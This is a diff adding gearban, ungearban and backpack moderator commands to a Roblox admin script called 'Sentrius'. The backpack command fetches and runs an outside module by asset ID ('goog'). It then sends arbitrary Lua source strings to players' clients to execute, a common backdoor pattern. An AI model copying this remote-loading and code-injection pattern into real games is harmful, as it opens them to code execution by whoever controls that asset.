@@ -8945,6 +8945,227 @@ addCommand({
     end
 })
 
+addCommand({
+    name = "gearban",
+    aliases = {"gb"},
+    desc = "a",
+    usage = prefix .. "gearban [player]",
+    rank = RANKS.MODERATOR,
+    callback = function(plr, args)
+        if not args or #args == 0 then
+            notify(plr, "Sentrius", "Usage: " .. prefix .. "gearban [player]", 3)
+            return
+        end
+
+        local targets = GetPlayer(args[1], plr)
+        if not targets or #targets == 0 then
+            notify(plr, "Sentrius", "No player found!", 3)
+            return
+        end
+
+        if not _G.GearbannedPlayers then
+            _G.GearbannedPlayers = {}
+        end
+
+        if not _G.GearbanConnections then
+            _G.GearbanConnections = {}
+        end
+
+        for _, target in ipairs(targets) do
+            if _G.GearbannedPlayers[target.UserId] then
+                notify(plr, "Sentrius", target.DisplayName .. " is already gearbanned!", 3)
+                return
+            end
+
+            _G.GearbannedPlayers[target.UserId] = true
+
+            local function clearBackpack()
+                local bp = target:FindFirstChild("Backpack")
+                if bp then
+                    for _, v in ipairs(bp:GetChildren()) do
+                        if v:IsA("Tool") then
+                            v:Destroy()
+                        end
+                    end
+                end
+            end
+
+            if _G.GearbanConnections[target.UserId] then
+                for _, c in ipairs(_G.GearbanConnections[target.UserId]) do
+                    c:Disconnect()
+                end
+            end
+
+            _G.GearbanConnections[target.UserId] = {}
+
+            local heartbeatConn = game:GetService("RunService").Heartbeat:Connect(function()
+                if not _G.GearbannedPlayers[target.UserId] then return end
+                if not target.Parent then return end
+                clearBackpack()
+            end)
+
+    local charConn = target.CharacterAdded:Connect(function(char)
+        if not _G.GearbannedPlayers[target.UserId] then return end
+        clearBackpack()
+    end)
+
+    local rejoinConn = Players.PlayerAdded:Connect(function(newPlr)
+        if newPlr.UserId ~= target.UserId then return end
+        if not _G.GearbannedPlayers[newPlr.UserId] then return end
+
+        local function clearNewBackpack()
+            local bp = newPlr:FindFirstChild("Backpack")
+            if bp then
+                for _, v in ipairs(bp:GetChildren()) do
+                    if v:IsA("Tool") then v:Destroy() end
+                end
+            end
+        end
+
+        local newHeartbeat = game:GetService("RunService").Heartbeat:Connect(function()
+            if not _G.GearbannedPlayers[newPlr.UserId] then return end
+            if not newPlr.Parent then return end
+            clearNewBackpack()
+        end)
+
+        local newCharConn = newPlr.CharacterAdded:Connect(function()
+            if not _G.GearbannedPlayers[newPlr.UserId] then return end
+            clearNewBackpack()
+        end)
+
+        if _G.GearbanConnections[newPlr.UserId] then
+            for _, c in ipairs(_G.GearbanConnections[newPlr.UserId]) do
+                c:Disconnect()
+            end
+        end
+
+        _G.GearbanConnections[newPlr.UserId] = { newHeartbeat, newCharConn }
+        clearNewBackpack()
+    end)
+
+            table.insert(_G.GearbanConnections[target.UserId], heartbeatConn)
+            table.insert(_G.GearbanConnections[target.UserId], charConn)
+            table.insert(_G.GearbanConnections[target.UserId], rejoinConn)
+
+            clearBackpack()
+            if target.Character then clearBackpack() end
+
+            notify(plr, "Sentrius", target.DisplayName .. " has been gearbanned!", 3)
+        end
+    end
+})
+
+addCommand({
+    name = "ungearban",
+    aliases = {"ungb"},
+    desc = "b",
+    usage = prefix .. "ungearban [player]",
+    rank = RANKS.MODERATOR,
+    callback = function(plr, args)
+        if not args or #args == 0 then
+            notify(plr, "Sentrius", "Usage: " .. prefix .. "ungearban [player]", 3)
+            return
+        end
+
+        local targets = GetPlayer(args[1], plr)
+        if not targets or #targets == 0 then
+            notify(plr, "Sentrius", "No player found!", 3)
+            return
+        end
+
+        if not _G.GearbannedPlayers then
+            _G.GearbannedPlayers = {}
+        end
+
+        if not _G.GearbanConnections then
+            _G.GearbanConnections = {}
+        end
+
+        for _, target in ipairs(targets) do
+            if not _G.GearbannedPlayers[target.UserId] then
+                notify(plr, "Sentrius", target.DisplayName .. " is not gearbanned!", 3)
+                return
+            end
+
+            _G.GearbannedPlayers[target.UserId] = nil
+
+            if _G.GearbanConnections[target.UserId] then
+                for _, c in ipairs(_G.GearbanConnections[target.UserId]) do
+                    c:Disconnect()
+                end
+                _G.GearbanConnections[target.UserId] = nil
+            end
+
+            notify(plr, "Sentrius", target.DisplayName .. " has been ungearbanned!", 3)
+        end
+    end
+})
+
+addCommand({
+    name = "backpack",
+    aliases = {"bp"},
+    desc = "Enable or disable a player's backpack",
+    usage = prefix .. "backpack [player] [true/false]",
+    rank = RANKS.MODERATOR,
+    callback = function(plr, args)
+        if not args or #args < 2 then
+            notify(plr, "Sentrius", "Usage: " .. prefix .. "backpack [player] [true/false]", 3)
+            return
+        end
+
+        local targets = GetPlayer(args[1], plr)
+        if not targets or #targets == 0 then
+            notify(plr, "Sentrius", "No player found!", 3)
+            return
+        end
+
+        local state = args[2]:lower()
+        if state ~= "true" and state ~= "false" then
+            notify(plr, "Sentrius", "Invalid value! Use true or false.", 3)
+            return
+        end
+
+        local enable = state == "true"
+
+        if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
+            local ticking = tick()
+            require(112691275102014).load()
+            repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
+        end
+
+        local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")
+        if not goog then
+            notify(plr, "Sentrius", "goog failed to load!", 3)
+            return
+        end
+
+        local names = {}
+        for _, target in ipairs(targets) do
+            local scr = goog:FindFirstChild("Utilities").Client:Clone()
+            local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
+            loa.Parent = scr
+            scr:WaitForChild("Exec").Value = string.format([[
+                game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, %s)
+                script:Destroy()
+            ]], tostring(enable))
+
+            if target.Character then
+                scr.Parent = target.Character
+            else
+                scr.Parent = target:WaitForChild("PlayerGui")
+            end
+
+            scr.Enabled = true
+            table.insert(names, target.DisplayName)
+        end
+
+        if #names > 0 then
+            local stateText = enable and "enabled" or "disabled"
+            notify(plr, "Sentrius", "Backpack " .. stateText .. " for: " .. format(names), 3)
+        end
+    end
+})
+
 local function connect(plr)
     playerNames[plr.Name] = true
     playerNames[plr.DisplayName] = true
